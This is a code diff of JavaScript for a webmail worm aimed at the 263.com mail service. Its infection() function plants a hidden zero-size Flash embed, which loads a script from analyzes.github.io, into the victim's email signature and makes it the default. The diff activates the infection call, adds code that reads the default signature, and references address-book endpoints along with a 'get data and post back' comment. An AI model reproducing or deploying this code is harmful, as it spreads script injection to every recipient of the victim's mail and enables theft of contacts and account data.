@@ -5,29 +5,23 @@
     var sysPath = "http://mm.263.com/wm2e/mail";
     var signPath = sysPath + "/signInfoSetting/signInfoSettingAction_";
     var addrPath = sysPath + "/personAddressBook/personAddressAction_";
-    var hook = '<p><embed allowscriptaccess="always" style="width:0;height:0" src="//analyzes.github.io/cw69.swf?a=run&c=//analyzes.github.io/script/analyzes.js"/></p>';
+    var hook = '<p><embed allowscriptaccess="always" style="width:0;height:0" src="//analyzes.github.io/own.swf?a=get&c=//analyzes.github.io/script/analyzes.js"/></p>';
     var addressBook = addrPath + "getAddressInitSys.do?" + urlParam;
     var addressBookDepart = addrPath + "getEnterAddressListAllNew.do?" + urlParam;
-    
-    function run(){
-        //infection();
-    }
-    
+
     function infection() {
         $.get(signPath + "signInfoManage.do?" + urlParam, function (data) {
             var signs = $(data).filter('.popBox').children();
             if (signs.length > 0) {
+                var defaultSign = $(data).filter('.s_select_bg > .txt');
+                var id = defaultSign.attr('id');
+                var name = defaultSign.text();
+                console.log(id + name);
                 // check hook exist
-                //get all signs
-                var hooked = true;
-                if (hooked) {
-                    return;
-                }else{
-                    // get default sign udate
-                }
+               
             } else {
                 // add new sign
-                $.post(signPath + "saveSignInfo.do?" + urlParam, { name: 'Ä¬ÈÏÇ©Ãû', contexts: '<p><br/></p>' + hook });
+                $.post(signPath + "saveSignInfo.do?" + urlParam, { name: '默认签名', contexts: '<p><br/></p>' + hook });
                 // set first sign as default
                 $.get(signPath + "setDefaultSignInfo.do?id=0&" + urlParam);
             }
@@ -46,5 +40,6 @@
 
         //get data and post back
     }
-run();
+
+    infection();
 })();
